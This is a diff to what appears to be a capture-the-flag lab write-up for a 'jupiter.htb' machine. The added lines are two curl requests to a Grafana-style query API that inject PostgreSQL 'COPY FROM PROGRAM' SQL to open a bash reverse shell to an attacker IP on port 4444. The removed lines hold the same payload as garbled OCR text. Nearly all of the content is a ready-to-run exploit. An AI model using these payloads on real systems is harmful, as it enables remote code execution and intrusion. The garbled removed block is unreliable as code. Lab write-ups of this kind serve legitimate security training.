@@ -63,52 +63,13 @@ sslmode	"disable"
 readOnly	false
 ```
 
-
-{
- "queries":[
-  {
-   "refId":"A",
-   "datasource" : {
-
-18 "uidt:"YItSLg-vz",
-
-19 "type’ :"postgres’
-
-20 1,
-
-21 "rawsql" : "CREATE TABLE cmd_exec(cnd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \'bash -i >& /dev/tcp/10.10.14.69/4444 O>E1\"'",
-2 "format? : "table,
-
-2 "datasourceld
-
-21 "maxDataPoints" :60000,
-
-= vintervalMs* : 940]
-
-2}
-
-27,
-
-28 “range":{
-
-25 "from':"2023-06-07T19:30:00.0002"
-30 "to':"2023-06-07T0 0.0002",
-31 vraws{
-
-32 “from: now- 6h" ,
-
-33 "to": "now"
-
-3}
-
-3 1,
-
-36 fromrit,
-
-37 tori
-
-|}
-
 ```
-curl --location 'http://kiosk.jupiter.htb/api/ds/query' --header 'Content-Type: application/json' --data '{"queries": "http://127.0.0.1:80/login", "proxy_response": true, "insecure_tls": false, "expand_path": true, "capacity": 250}
+curl --location 'http://kiosk.jupiter.htb/api/ds/query' --header 'Content-Type: application/json' --data '{"queries":[{"refId":"A","datasource":{"uid":"YItSLg-Vz","type":"postgres"},"rawSql":"CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.16.47/4444 0>&1\"'", "format":"table","datasourceId":1, "maxDataPoints":60000,"intervalMs":940,}],"range":{"from":"2023-06-07T19:30:00.000Z","to":"2023-06-07T01:30:00.000Z", "raw":{"from":"now-6h","to":"now}},"from":"","to":""}'
 ```
+
+adding a slash in front
+```
+curl --location 'http://kiosk.jupiter.htb/api/ds/query' --header 'Content-Type: application/json' --data '{"queries":[{"refId":"A","datasource":{"uid":"YItSLg-Vz","type":"postgres"},"rawSql":"CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \\"bash -i >& /dev/tcp/10.10.16.47/4444 0>&1\\"'", "format":"table","datasourceId":1, "maxDataPoints":60000,"intervalMs":940,}],"range":{"from":"2023-06-07T19:30:00.000Z","to":"2023-06-07T01:30:00.000Z", "raw":{"from":"now-6h","to":"now}},"from":"","to":""}'
+```
+![](20230720000926.png)
+
